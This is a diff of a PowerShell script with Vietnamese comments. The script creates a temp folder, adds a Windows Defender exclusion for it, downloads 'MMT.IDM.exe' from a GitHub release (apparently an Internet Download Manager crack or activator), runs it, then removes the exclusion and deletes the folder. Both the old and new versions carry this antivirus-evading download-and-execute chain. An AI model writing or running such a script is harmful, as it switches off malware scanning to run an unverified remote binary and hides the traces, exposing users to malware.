@@ -1,29 +1,24 @@
-# Xac dinh thu muc dich
-$folderPath = Join-Path $env:TEMP "MMTPC"
-$filePath   = Join-Path $folderPath "MMT.IDM.exe"
+# Đường dẫn thư mục
+$TempFolder = "$env:LOCALAPPDATA\Temp\MMTPC"
+$ExePath = Join-Path $TempFolder "MMT.IDM.exe"
+$Url = "https://github.com/ghostminhtoan/private/releases/download/MMT/MMT.IDM.exe"
 
-# Kiem tra bien truoc khi dung
-if ([string]::IsNullOrWhiteSpace($folderPath)) {
-    Write-Error "Khong xac dinh duoc duong dan folder."
-    exit
+# 1. Tạo thư mục MMTPC
+if (!(Test-Path $TempFolder)) {
+    New-Item -ItemType Directory -Path $TempFolder | Out-Null
 }
 
-# Tao thu muc neu chua ton tai
-if (-not (Test-Path $folderPath)) {
-    New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
-}
+# 2. Thêm exclusion cho Windows Defender
+Add-MpPreference -ExclusionPath $TempFolder
 
-# Them exclusion
-Add-MpPreference -ExclusionPath $folderPath -Force -ErrorAction SilentlyContinue
+# 3. Tải file về
+Invoke-WebRequest -Uri $Url -OutFile $ExePath
 
-# Tai file
-Invoke-WebRequest -Uri "https://github.com/ghostminhtoan/private/releases/download/MMT/MMT.IDM.exe" -OutFile $filePath -ErrorAction SilentlyContinue
+# 4. Chạy file và chờ nó đóng
+Start-Process -FilePath $ExePath -Wait
 
-# Chay file neu tai thanh cong
-if (Test-Path $filePath) {
-    Start-Process -FilePath $filePath -Wait
-    Remove-Item $filePath -Force -ErrorAction SilentlyContinue
-}
+# 5. Xoá exclusion
+Remove-MpPreference -ExclusionPath $TempFolder
 
-# Xoa exclusion
-Remove-MpPreference -ExclusionPath $folderPath -Force -ErrorAction SilentlyContinue
+# 6. Xoá thư mục MMTPC
+Remove-Item -Path $TempFolder -Recurse -Force
